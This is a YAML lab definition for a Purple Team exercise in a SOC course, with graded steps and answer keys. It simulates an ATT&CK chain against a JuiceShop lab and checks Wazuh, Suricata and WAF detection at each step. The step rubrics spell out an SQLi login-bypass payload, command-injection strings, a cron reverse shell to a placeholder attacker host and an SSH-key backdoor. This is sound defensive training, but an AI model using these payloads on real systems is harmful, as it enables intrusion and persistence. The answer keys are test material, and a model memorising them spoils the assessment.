lab_id: soc-adv-ai-week13
title: Purple Team 연습 - 공격과 방어의 통합 (AI 지원)
version: ai
course: soc-adv-ai
week: 13
description: Red Team(공격)과 Blue Team(방어)이 협업하여 탐지 역량을 검증하고 개선하는 Purple Team 연습 실습. AI SubAgent가 자동으로 명령을
  실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- Purple Team 방법론을 이해하고 적용할 수 있다
- ATT&CK 기반 공격 시뮬레이션과 탐지 검증을 수행할 수 있다
- 탐지 갭을 식별하고 개선할 수 있다
pass_threshold: 0.6
steps:
- order: 1
  instruction: Purple Team의 개념과 Red/Blue Team과의 차이를 설명하라. Purple Team 연습의 목적, 참여자, 프로세스를 정의하라.
  hint: Purple Team은 대립이 아닌 협업에 초점을 맞춘다
  category: framework
  points: 8
  answer: '🤖 프롬프트: Purple Team의 개념과 Red/Blue Team과의 차이를 설명하라. Purple Team 연습의 목적, 참여자, 프로세스를 정의해줘

    📎 참고 (CLI): Red Team: 목표 달성(침투), 독립적. Blue Team: 탐지/대응. Purple Team: 협업→공격 시뮬레이션+실시간 탐지 검증. 목적: 탐지
    갭 식별과 즉각적 개선'
  answer_detail: Purple Team은 Red Team의 공격 기법을 Blue Team의 탐지 관점에서 즉시 검증한다. 전통적 Red Team 평가와 달리 결과를 기다리지
    않고, 각 기법별로 즉시 탐지 여부를 확인하고 개선한다.
  verify:
    type: output_contains
    expect: Purple
    semantic:
      intent: 'Purple Team 개념 — SANS SEC599/CISA 정의: Red(공격자 관점 목표 달성·TTPs 구현·독립적 engagement) + Blue(탐지·분석·대응·룰
        운영) 가 같은 방에서 실시간 협업. 목적: (1) 각 Technique 별 즉시 탐지 검증 (2) 탐지 갭을 연습 중 즉시 개선 (3) 지식 전이(Red → Blue
        공유). 참여자: Red operator, Blue analyst, Purple lead/facilitator, Data engineer. 프로세스: scenario 선정
        → attack execution → detection validation → rule tuning → re-test. MITRE Purple Teaming Exercise
        Framework 참조'
      success_criteria:
      - Red/Blue/Purple 3자 구분 정의
      - 협업의 목적(즉시 검증·갭 개선) 명시
      - 참여자 역할 또는 프로세스 단계
      acceptable_methods:
      - SANS SEC599 Purple Team 방법론
      - MITRE Purple Teaming Exercise Framework
      - J. Oakley Purple Team Strategies 프레임워크
      - TIBER-EU(Threat Intelligence-Based Ethical Red Teaming)
      - Adversary Emulation Plan(CALDERA based)
      negative_signs:
      - Red/Blue 대립 구도로만 설명
      - 협업/실시간 검증 의미 부재
      - 참여자 역할 누락
  target_vm: siem
  script: 'Red Team: 목표 달성(침투), 독립적. Blue Team: 탐지/대응. Purple Team: 협업→공격 시뮬레이션+실시간 탐지 검증. 목적: 탐지 갭 식별과
    즉각적 개선'
  risk_level: low
  bastion_prompt: Purple Team의 개념과 Red/Blue Team과의 차이를 설명하라. Purple Team 연습의 목적, 참여자, 프로세스를 정의해줘
- order: 2
  instruction: ATT&CK 기반 공격 시나리오를 설계하라. 5개 이상의 Tactic에 걸친 공격 체인(Initial Access → Execution → Persistence
    → Lateral Movement → Exfiltration)을 설계하라.
  hint: 각 단계에 구체적인 Technique ID와 실행 방법을 명시하라
  category: planning
  points: 12
  answer: '🤖 프롬프트: ATT&CK 기반 공격 시나리오를 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): 공격 체인: T1190(웹 취약점 악용)→T1059.004(bash 실행)→T1053.003(cron 지속성)→T1021.004(SSH 횡적이동)→T1048(대체프로토콜
    유출). 각 단계의 구체적 명령 포함'
  answer_detail: 공격 시나리오는 실제 위협 행위자의 TTP를 모방해야 한다. 각 단계의 ATT&CK Technique을 명시하고, 탐지 예상 여부를 사전에 기록하여 연습
    후 비교한다.
  verify:
    type: output_contains
    expect:
    - ATT&CK
    - MITRE
    - T1190
    - kill chain
    - tactic
    - technique
    semantic:
      intent: 'ATT&CK 공격 체인 설계 — 5+ tactic cross-cut kill chain: T1190(Exploit Public-Facing Application,
        SQLi on JuiceShop) → TA0002 T1059.004(Unix Shell, /bin/bash reverse shell) → TA0003 T1053.003(Scheduled
        Task: Cron) 또는 T1098.004(SSH Authorized Keys) → TA0008 T1021.004(Remote Services: SSH) → TA0010
        T1048.003(Exfil over Unencrypted/Obfuscated Non-C2, DNS tunneling). 각 step 에 actual command +
        expected detection source + expected alert 3단계 문서화. adversary emulation plan(APT29/FIN7) 참조'
      success_criteria:
      - 최소 5개 Technique ID(Txxxx.xxx) 제시
      - 각 단계의 구체 실행 명령 포함
      - 각 단계의 예상 탐지 소스 명시
      acceptable_methods:
      - MITRE ATT&CK Enterprise Matrix v14
      - MITRE CALDERA adversary emulation plan
      - Red Canary Atomic Red Team 테스트 조합
      - Prelude Operator campaigns
      - SCYTHE emulation campaigns
      negative_signs:
      - Technique ID 없이 일반론
      - 4 tactic 이하
      - 예상 탐지 소스 없음
  target_vm: siem
  script: '공격 체인: T1190(웹 취약점 악용)→T1059.004(bash 실행)→T1053.003(cron 지속성)→T1021.004(SSH 횡적이동)→T1048(대체프로토콜
    유출). 각 단계의 구체적 명령 포함'
  risk_level: low
  bastion_prompt: ATT&CK 기반 공격 시나리오를 설계하라. 5개 이상의 Tactic에 걸친 공격 체인(Initial Access → Execution → Persistence
    → Lateral Movement → Exfiltration)을 설계하라.
- order: 3
  instruction: '공격 시뮬레이션 1단계: Initial Access를 실행하라. 웹서버({{WEB_IP}})의 JuiceShop에 SQL Injection 공격을 수행하고,
    Blue Team의 탐지 여부를 확인하라.'
  hint: OWASP JuiceShop의 알려진 SQLi 취약점을 활용하라
  category: simulation
  points: 10
  answer: '🤖 프롬프트: 공격 시뮬레이션 1단계: Initial Access를 실행해줘

    📎 참고 (CLI): 공격: JuiceShop SQLi 실행(로그인 우회 또는 데이터 추출). 탐지 확인: Wazuh 알림 발생 여부, Suricata 알림 발생 여부, WAF
    로그 기록 여부'
  answer_detail: Initial Access 단계의 탐지는 SOC의 첫 번째 방어선이다. SQLi 공격이 SIEM, IDS, WAF 중 어디에서 탐지되었는지 확인하고, 미탐지
    지점을 기록한다.
  verify:
    type: output_contains
    expect:
    - SQL
    - SQLi
    - JuiceShop
    - Initial Access
    - T1190
    - 로그인 우회
    semantic:
      intent: 'Initial Access 시뮬레이션 (T1190) — JuiceShop 로그인 우회 SQLi: POST /rest/user/login Body {"email":"admin@juice-sh.op`--","password":"anything"}
        또는 error-based UNION SELECT. 탐지 확인: (1) Wazuh rule 31103/31106 alerts.json (2) Suricata alert.signature
        가 ET WEB_SPECIFIC_APPS OWASP SQLi (3) ModSecurity CRS rule 942100-942520 modsec_audit.log. 각 도구별
        탐지 여부 기록 → detection matrix 입력'
      success_criteria:
      - 구체적 SQLi payload 제시
      - Wazuh·Suricata·WAF 3도구 탐지 확인
      - detection/miss 결과 기록
      acceptable_methods:
      - curl -X POST -d <payload> 로 직접 요청
      - sqlmap -u <URL> --level 3 --risk 2
      - Burp Suite Intruder + SQLi payload list
      - OWASP ZAP active scan
      - nuclei -t cves/juiceshop/
      negative_signs:
      - payload 없이 개념만
      - 3도구 중 2개 이하만 확인
      - 탐지 결과 기록 누락
  target_vm: siem
  script: '공격: JuiceShop SQLi 실행(로그인 우회 또는 데이터 추출). 탐지 확인: Wazuh 알림 발생 여부, Suricata 알림 발생 여부, WAF 로그 기록
    여부'
  risk_level: low
  bastion_prompt: '공격 시뮬레이션 1단계: Initial Access를 실행해줘'
- order: 4
  instruction: '공격 시뮬레이션 2단계: Execution을 실행하라. 웹쉘 업로드 또는 명령 인젝션으로 셸 접근을 확보하고, Blue Team의 탐지 여부를 확인하라.'
  hint: 웹서버에서 반환되는 명령 실행 결과를 확인하라
  category: simulation
  points: 10
  answer: '🤖 프롬프트: 공격 시뮬레이션 2단계: Execution을 실행해줘

    📎 참고 (CLI): 공격: 명령 인젝션으로 id, whoami 실행. 탐지: Wazuh 프로세스 모니터링 알림, Suricata HTTP 페이로드 탐지, apache 에러 로그'
  answer_detail: Execution 단계 탐지는 침투 성공을 식별하는 핵심이다. 웹서버 프로세스(apache/nginx)에서 비정상 자식 프로세스(bash, sh, python)가
    생성되면 침해 가능성이 매우 높다.
  verify:
    type: output_contains
    expect:
    - Execution
    - T1059
    - bash
    - Command Injection
    - auditd
    - Sysmon
    semantic:
      intent: 'Execution 시뮬레이션 (T1059.004 Unix Shell) — Command Injection 또는 웹쉘을 통한 bash 실행: curl http://<web>/api/search?q=`;id;whoami;uname
        -a;` 또는 업로드된 cmd.php?c=id. 탐지 확인: (1) Wazuh auditd rule key=process_exec 이벤트(apache→bash 부모자식
        관계 비정상) (2) Sysmon for Linux EventID 1 (process creation) (3) Suricata alert.signature ET WEB
        명령어 패턴(;id;|;whoami;) (4) Apache error.log 에 비정상 출력. MITRE D3-PA(Process Analysis) 탐지'
      success_criteria:
      - 구체 실행 명령(id/whoami/uname)
      - apache→bash 비정상 parent-child 관계 언급
      - 최소 2개 도구의 탐지 이벤트 확인
      acceptable_methods:
      - curl + backtick/$() 로 쉘 명령
      - 업로드된 PHP/JSP webshell 사용
      - auditd execve -k process_exec 로그 확인
      - Sysmon for Linux Event ID 1
      - Falco rule shell_in_container
      negative_signs:
      - 실행 명령 없이 개념만
      - parent-child 관계 미언급
      - 탐지 소스 1개만
  target_vm: siem
  script: '공격: 명령 인젝션으로 id, whoami 실행. 탐지: Wazuh 프로세스 모니터링 알림, Suricata HTTP 페이로드 탐지, apache 에러 로그'
  risk_level: low
  bastion_prompt: '공격 시뮬레이션 2단계: Execution을 실행해줘'
- order: 5
  instruction: '공격 시뮬레이션 3단계: Persistence를 설정하라. cron job 또는 SSH authorized_keys에 백도어를 설치하고, Blue Team의
    탐지 여부를 확인하라.'
  hint: crontab -e 또는 echo >> ~/.ssh/authorized_keys
  category: simulation
  points: 10
  answer: '🤖 프롬프트: 공격 시뮬레이션 3단계: Persistence를 설정하라. cron job 또는 SSH authorized_keys에 백도어를 설치하고, Blue Team의
    탐지 여부를 확인해줘

    📎 참고 (CLI): 공격: cron에 리버스쉘 등록 또는 SSH 키 추가. 탐지: Wazuh FIM(crontab 변경 탐지), SSH 설정 변경 알림, 신규 cron job
    알림'
  answer_detail: Persistence 탐지는 공격자의 장기 접근을 방지한다. 파일 무결성 모니터링(FIM)이 핵심이며, crontab, authorized_keys, systemd
    서비스 파일의 변경을 감시해야 한다.
  verify:
    type: output_contains
    expect:
    - Persistence
    - T1053
    - T1098
    - cron
    - SSH
    - authorized_keys
    - FIM
    semantic:
      intent: 'Persistence 시뮬레이션 (T1053.003 Cron + T1098.004 SSH Authorized Keys) — (1) crontab -e 에 */5
        * * * * /bin/bash -c "bash -i >& /dev/tcp/<attacker>/4444 0>&1" 추가 또는 (2) echo "ssh-rsa AAAAB3...attacker_pubkey"
        >> ~/.ssh/authorized_keys. 탐지: Wazuh FIM syscheck realtime=yes 로 /var/spool/cron/*, /home/*/.ssh/authorized_keys,
        /etc/crontab 변경 감지, auditd -w /etc/cron.d -p wa -k cron_change, Wazuh rule 2902(New authorized_keys).
        MITRE M1022(Restrict File and Directory Permissions)'
      success_criteria:
      - cron 또는 authorized_keys 구체 페이로드
      - Wazuh FIM syscheck 또는 auditd watch 설정
      - 탐지 룰 또는 이벤트 ID 명시
      acceptable_methods:
      - crontab -e + reverse shell cron entry
      - echo pubkey >> ~/.ssh/authorized_keys
      - systemd user service persistence(~/.config/systemd/user)
      - Wazuh FIM realtime + whodata 로 변경 주체 캡처
      - auditd -w 와 Osquery file_events 테이블
      negative_signs:
      - 실제 파일 변경 없이 개념만
      - FIM 또는 auditd 설정 언급 없음
      - 변경 주체(who-data) 캡처 미고려
  target_vm: siem
  script: '공격: cron에 리버스쉘 등록 또는 SSH 키 추가. 탐지: Wazuh FIM(crontab 변경 탐지), SSH 설정 변경 알림, 신규 cron job 알림'
  risk_level: low
  bastion_prompt: '공격 시뮬레이션 3단계: Persistence를 설정하라. cron job 또는 SSH authorized_keys에 백도어를 설치하고, Blue Team의
    탐지 여부를 확인해줘'
- order: 6
  instruction: '공격 시뮬레이션 4단계: Lateral Movement를 수행하라. 확보한 접근 권한으로 다른 내부 시스템({{SECU_IP}}00 등)으로 이동을 시도하라.'
  hint: SSH 키 재사용 또는 발견된 비밀번호로 다른 서버 접속 시도
  category: simulation
  points: 10
  answer: '🤖 프롬프트: 공격 시뮬레이션 4단계: Lateral Movement를 수행해줘

    📎 참고 (CLI): 공격: web→siem SSH 접속 시도, 내부 네트워크 스캔. 탐지: nftables 내부→내부 비정상 연결 로그, Wazuh SSH 인증 알림, Suricata
    내부 스캔 탐지'
  answer_detail: Lateral Movement는 피해 범위를 확대하는 핵심 단계이다. 내부 네트워크 모니터링이 미흡하면 탐지가 어려우므로, 내부 세그먼트 간 트래픽도 모니터링해야
    한다.
  verify:
    type: output_contains
    expect: Lateral
    semantic:
      intent: 'Lateral Movement 시뮬레이션 (T1021.004 SSH) — 획득 자격증명 또는 SSH 키 재사용으로 web → siem/secu 세그먼트 이동:
        ssh -i /tmp/.hidden_key admin@<siem-internal-ip>, 또는 nmap -sT -p 22,3306,6379 <internal-subnet>/24
        로 recon. 탐지 (내부 east-west 가시성 필수): (1) nftables log prefix INTERNAL_SSH 로 내부→내부 SSH 연결 드롭/로그 (2)
        Wazuh rule 5715(SSH authentication from unusual source) + custom rule source.ip not in trusted_cidr
        (3) Suricata 내부 인터페이스 구독으로 scan 탐지 ET SCAN Potential SSH Scan. Zero Trust microsegmentation 없으면
        가시성 갭'
      success_criteria:
      - 내부→내부 east-west 트래픽 모니터링 개념
      - SSH 또는 scan 구체 명령
      - internal segment 가시성 도구(nftables log/Suricata inline) 언급
      acceptable_methods:
      - ssh -i key <internal-ip>
      - nmap/masscan 내부 subnet scan
      - Impacket psexec/wmiexec 대체(Windows 환경)
      - nftables log prefix + rsyslog 중앙 수집
      - Zeek/Bro conn.log 로 east-west flow 분석
      negative_signs:
      - north-south 경계만 관찰(내부 미관찰)
      - 구체 명령 없이 설명만
      - east-west 가시성 갭 미인지
  target_vm: siem
  script: '공격: web→siem SSH 접속 시도, 내부 네트워크 스캔. 탐지: nftables 내부→내부 비정상 연결 로그, Wazuh SSH 인증 알림, Suricata
    내부 스캔 탐지'
  risk_level: low
  bastion_prompt: '공격 시뮬레이션 4단계: Lateral Movement를 수행해줘'
- order: 7
  instruction: '공격 시뮬레이션 5단계: Exfiltration을 시도하라. 수집한 데이터를 DNS 터널링, HTTP POST, 또는 기타 방법으로 외부로 전송을 시도하라.'
  hint: base64로 데이터를 인코딩하여 DNS 쿼리의 서브도메인에 포함하라
  category: simulation
